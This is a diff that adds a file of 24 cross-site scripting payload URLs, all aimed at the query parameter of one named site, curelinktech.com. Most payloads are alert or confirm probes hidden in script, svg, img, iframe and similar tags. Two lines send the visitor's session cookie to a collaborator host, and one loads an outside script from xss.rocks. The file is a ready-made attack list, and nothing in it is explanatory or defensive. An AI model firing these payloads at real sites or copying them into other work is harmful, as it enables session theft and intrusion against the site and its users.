@@ -1,0 +1,24 @@
+https://curelinktech.com/q=<script>alert(1)</script>
+https://curelinktech.com/q="><svg/onload=alert(1)>
+https://curelinktech.com/q='><img src=x onerror=alert(1)>
+https://curelinktech.com/q=<iframe src="javascript:alert(1)"></iframe>
+https://curelinktech.com/q=<svg><script>alert(1)</script>
+https://curelinktech.com/q=<details open ontoggle=alert(1)>
+https://curelinktech.com/q=<math><mtext></mtext><script>alert(1)</script>
+https://curelinktech.com/q=<video><source onerror="alert(1)">
+https://curelinktech.com/q=<marquee onstart=alert(1)>
+https://curelinktech.com/q=<isindex type=image src=1 onerror=alert(1)>
+https://curelinktech.com/q=<svg onload=confirm(1)>
+https://curelinktech.com/q=<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+https://curelinktech.com/q=<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+https://curelinktech.com/q=<svg><foreignObject><iframe srcdoc="<script>alert(1)</script>"></iframe></foreignObject></svg>
+https://curelinktech.com/q=<svg><style>@keyframes x{}</style><x onanimationstart=alert(1) style="animation-name:x"></x></svg>
+https://curelinktech.com/q="><script src=//xss.rocks/xss.js></script>
+https://curelinktech.com/q="><script>fetch('https://your-burpcollab.com?c='+document.cookie)</script>
+https://curelinktech.com/q="><img src=x onerror=fetch('https://your-burpcollab.com?c='+document.cookie)>
+https://curelinktech.com/q="><input onfocus=alert(1) autofocus>
+https://curelinktech.com/q="><body onload=alert(1)>
+https://curelinktech.com/q="><object data="javascript:alert(1)">
+https://curelinktech.com/q="><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+https://curelinktech.com/q="><a href="javascript:alert(1)">click</a>
+https://curelinktech.com/q="><form><button formaction="javascript:alert(1)">X</button></form>
